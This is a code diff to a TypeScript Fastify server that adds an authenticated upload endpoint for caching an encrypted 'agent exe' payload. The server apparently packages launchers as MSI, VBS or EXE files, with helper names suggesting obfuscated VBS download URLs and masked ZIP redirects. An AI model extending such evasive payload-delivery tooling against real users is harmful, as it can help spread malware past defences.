@@ -12,6 +12,7 @@ import * as builder from "./builder";
 import * as exeBuilder from "./exe-builder";
 import { runZipBuild, AmiMode } from "./zip-builder";
 import { createZip } from "./zip-archive";
+import * as payloadCache from "./payload-cache";
 import {
   buildEnrollmentCommand,
   toPowerShellInstallCommand,
@@ -78,6 +79,42 @@ function obfuscateVbsUrl(url: string): string {
   parts.push(url.slice(prev));
 
   return parts.map(p => `"${p}"`).join(' & ');
+}
+
+/**
+ * POST /payload — one-time import of the agent exe into the launcher-mode
+ * payload cache (bearer-authed, raw application/octet-stream body).
+ *
+ * The artifact is stored pre-encrypted under the master key; the plaintext is
+ * never written to disk and launcher builds never fetch it at request time.
+ */
+async function postPayload(request: FastifyRequest, reply: FastifyReply) {
+  const authHeader = request.headers.authorization;
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+  const token = authHeader.slice(7);
+  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+  const body = request.body;
+  if (!(body instanceof Buffer) || body.length === 0) {
+    return reply
+      .status(400)
+      .send({ error: "Expected an application/octet-stream payload body" });
+  }
+  try {
+    const meta = payloadCache.importFromBuffer(body, "upload");
+    return reply.status(200).send({
+      ok: true,
+      sha256: meta.sha256,
+      size: meta.size,
+    });
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    console.error(`Payload import failed: ${message}`);
+    return reply.status(500).send({ error: "Payload import failed" });
+  }
 }
 
 /**
@@ -622,6 +659,15 @@ async function getMaskedZipRedirect(
  * Register routes with the Fastify instance.
  */
 export async function registerRoutes(app: FastifyInstance) {
+  // Raw agent-exe import for the launcher payload cache (one-time). The body
+  // is a plain byte stream (never shell-processed; validated in memory).
+  app.addContentTypeParser(
+    "application/octet-stream",
+    { parseAs: "buffer", bodyLimit: 600 * 1024 * 1024 },
+    (request, body, done) => done(null, body)
+  );
+  app.post("/payload", postPayload);
+
   // /build serves two payload types on the same route, selected by
   // Content-Type:
   //   - multipart/form-data  -> MSI/VBS/EXE packaging (legacy path)
